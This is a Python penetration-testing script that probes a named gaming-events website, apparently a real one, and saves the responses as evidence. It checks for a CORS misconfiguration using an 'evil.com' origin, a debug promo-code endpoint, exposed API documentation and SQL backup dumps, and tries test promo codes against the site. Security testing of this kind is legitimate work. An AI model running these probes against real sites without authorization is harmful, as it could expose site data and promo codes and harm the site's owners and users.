#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
Real Data Downloader - Fetches actual server responses as evidence
"""

import requests
import json
import os
from datetime import datetime

BASE_URL = "https://insomniagamingegypt.com"
OUTPUT_DIR = "evidence\downloaded_data"

def ensure_dir():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

def save_data(filename, data):
    filepath = os.path.join(OUTPUT_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        if isinstance(data, dict):
            json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            f.write(str(data))
    print(f"[SAVED] {filepath}")
    return filepath

def fetch_url(endpoint, headers=None):
    url = f"{BASE_URL}{endpoint}"
    print(f"\n[FETCHING] {url}")
    try:
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        print(f"[STATUS] {response.status_code}")
        print(f"[SIZE] {len(response.text)} bytes")
        return response
    except Exception as e:
        print(f"[ERROR] {e}")
        return None

def download_all_evidence():
    ensure_dir()
    
    print("="*60)
    print("DOWNLOADING REAL EVIDENCE DATA")
    print("="*60)
    
    # 1. CORS Test - Capture the misconfiguration
    print("\n[1] Testing CORS misconfiguration...")
    cors_headers = {'Origin': 'https://evil.com'}
    resp = fetch_url('/api/public/events/1', headers=cors_headers)
    if resp:
        cors_data = {
            'test': 'CORS misconfiguration',
            'request_headers': dict(resp.request.headers),
            'response_headers': dict(resp.headers),
            'access_control_allow_origin': resp.headers.get('Access-Control-Allow-Origin'),
            'vulnerable': resp.headers.get('Access-Control-Allow-Origin') == 'https://evil.com'
        }
        save_data('finding_01_cors_headers.json', cors_data)
        save_data('finding_01_cors_response.txt', resp.text[:2000])
    
    # 2. Debug Endpoint - Try to access
    print("\n[2] Testing debug endpoint...")
    resp = fetch_url('/debug/events/1/promo-codes')
    if resp:
        debug_data = {
            'test': 'Debug endpoint access',
            'endpoint': '/debug/events/1/promo-codes',
            'status': resp.status_code,
            'exists': resp.status_code == 200,
            'content_type': resp.headers.get('Content-Type'),
            'response_preview': resp.text[:3000]
        }
        save_data('finding_02_debug_endpoint.json', debug_data)
        save_data('finding_02_debug_response.html', resp.text)
    
    # 3. API Documentation
    print("\n[3] Testing API documentation endpoints...")
    for doc_path in ['/swagger.json', '/openapi.json']:
        resp = fetch_url(doc_path)
        if resp and resp.status_code == 200:
            try:
                doc_data = resp.json()
                save_data(f'finding_03_{doc_path.replace("/", "_")}.json', doc_data)
            except:
                save_data(f'finding_03_{doc_path.replace("/", "_")}.txt', resp.text)
    
    # 4. Backup Files
    print("\n[4] Testing backup file access...")
    for backup_path in ['/backup.sql', '/database.sql', '/dump.sql']:
        resp = fetch_url(backup_path)
        if resp:
            backup_data = {
                'test': 'Backup file access',
                'path': backup_path,
                'status': resp.status_code,
                'content_type': resp.headers.get('Content-Type'),
                'size': len(resp.text),
                'is_accessible': resp.status_code == 200 and 'sql' in resp.headers.get('Content-Type', '')
            }
            save_data(f'finding_04_{backup_path.replace("/", "")}.json', backup_data)
            if len(resp.text) < 10000:  # Only save if not too large
                save_data(f'finding_04_{backup_path.replace("/", "")}_response.txt', resp.text[:5000])
    
    # 5. Promo Code Enumeration - Capture the response patterns
    print("\n[5] Testing promo code endpoint responses...")
    test_codes = ['INVALIDCODE123', 'FAKECODE999', 'TEST99999']
    responses = {}
    
    for code in test_codes:
        resp = fetch_url(f'/api/public/events/1/promo-codes/{code}')
        if resp:
            try:
                body = resp.json()
            except:
                body = resp.text
            
            responses[code] = {
                'status': resp.status_code,
                'headers': dict(resp.headers),
                'body': body
            }
        
        # Small delay between requests
        import time
        time.sleep(1)
    
    save_data('finding_05_promo_code_responses.json', responses)
    
    # 6. Main Event Data
    print("\n[6] Downloading event data...")
    resp = fetch_url('/api/public/events/1')
    if resp:
        try:
            event_data = resp.json()
            save_data('event_1_full_data.json', event_data)
        except:
            save_data('event_1_response.txt', resp.text)
    
    # 7. Questions endpoint
    print("\n[7] Downloading questions data...")
    resp = fetch_url('/api/public/events/1/questions')
    if resp:
        try:
            questions_data = resp.json()
            save_data('event_1_questions.json', questions_data)
        except:
            save_data('event_1_questions.txt', resp.text)
    
    print("\n" + "="*60)
    print("DOWNLOAD COMPLETE")
    print("="*60)
    print(f"All data saved to: {OUTPUT_DIR}")

if __name__ == "__main__":
    download_all_evidence()
